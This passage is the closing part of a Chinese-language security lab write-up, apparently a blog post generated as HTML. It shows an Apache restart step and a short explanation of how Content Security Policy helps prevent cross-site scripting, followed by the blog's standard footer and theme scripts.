+</span></span></span><span class="line"><span class="cl"><span class="s2">?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;?php include &#39;index.html&#39;;?&gt;
+</span></span></span></code></pre></div><p>保存并重启 Apache 服务：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ service apache2 restart
+</span></span></code></pre></div><p>刷新页面：</p>
+<img src="https://s2.loli.net/2024/11/11/4yLQHOzbSIRBEwm.png" alt="image-20241111173400228" style="zoom:50%;" />
+<h4 id="35-请解释为什么-csp-可以帮助防止跨站脚本攻击">3.5 请解释为什么 CSP 可以帮助防止跨站脚本攻击。<a hidden class="anchor" aria-hidden="true" href="#35-请解释为什么-csp-可以帮助防止跨站脚本攻击">#</a></h4>
+<ol>
+<li><strong>限制脚本来源</strong>： 可以指定只能执行同源的或者指定地址的 JS 脚本，防止未经允许的脚本执行。</li>
+<li><strong>阻止内联脚本执行</strong> ：可以防止攻击者在页面中插入恶意的 Button，点击后执行恶意脚本。</li>
+<li><strong>使用 Nonce 验证合法的脚本</strong>：只有带有正确 Nonce 的 JS 脚本才能执行，从而无法执行恶意脚本。</li>
+</ol>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://smera1d0.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">软件安全</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>SEEDlab—缓冲区溢出漏洞</span>
+  </a>
+</nav>
+
+  </footer><script src="https://giscus.app/client.js"
+        data-repo="Smera1d0/Smera1d0.github.io"
+        data-repo-id="R_kgDOIXSe_Q"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOIXSe_c4CmMtR"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>© <a href="https://github.com/adityatelange/hugo-PaperMod/graphs/contributors">PaperMod Contributors</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
